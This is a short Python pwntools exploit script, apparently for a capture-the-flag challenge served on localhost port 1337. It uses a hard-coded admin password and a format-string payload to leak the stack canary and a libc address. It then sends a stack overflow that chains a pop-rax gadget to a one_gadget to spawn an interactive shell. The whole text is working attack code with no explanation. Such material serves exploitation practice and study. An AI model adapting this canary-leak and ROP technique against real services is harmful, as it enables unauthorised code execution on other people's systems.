from pwn import *
context.log_level = "debug"
context.arch = "amd64"

p = remote("localhost", 1337)
p.sendline(b"admin")
password = b"secretpass123"
p.sendline(password.ljust(0x20, b"A") + b"%15$p%17$p")
p.recvuntil(b"entered:")
p.recvline()
leak = p.recvlineS()
canary, __libc_start_main_ret = [int(x, 16) for x in leak.split("W")[0].split("0x")[1:]]
print(hex(canary))
libc_base = __libc_start_main_ret - 0x2409b
p.sendline(b"2")
one_gadget = 0x4497f + libc_base
pop_rax = 0x000000000003a768 + libc_base
p.sendline(b"A" * (0x50 - 0x8) + p64(canary) + p64(0) + p64(pop_rax) + p64(0) + p64(one_gadget))
p.interactive()
